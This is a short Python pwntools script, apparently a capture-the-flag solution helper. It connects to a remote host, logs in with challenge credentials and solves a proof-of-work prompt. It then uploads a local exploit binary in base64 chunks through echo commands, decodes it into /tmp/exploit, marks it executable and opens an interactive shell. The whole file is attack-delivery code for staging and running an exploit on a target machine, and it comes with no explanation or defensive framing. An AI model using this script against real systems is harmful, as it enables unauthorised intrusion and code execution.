from pwn import *
import base64
context.log_level = "debug"

with open("./exp", "rb") as f:
    exp = base64.b64encode(f.read())

p = remote("138.68.69.139", 13370)
#p = process('./run.sh')

print(p.recvline())
pow_solution = input()
p.sendline(pow_solution)

try_count = 1
p.sendlineafter(b'login:', b'hxp')
p.sendlineafter(b'Password:', b'hxp')

while True:

    count = 0
    for i in range(0, len(exp), 0x200):
        p.sendlineafter(b'$', "echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /tmp/b64_exp")
        count += 1
        log.info("count: " + str(count))
    
    p.sendline("cat /tmp/b64_exp | base64 -d > /tmp/exploit")
    p.sendline("chmod +x /tmp/exploit")

    break

p.interactive()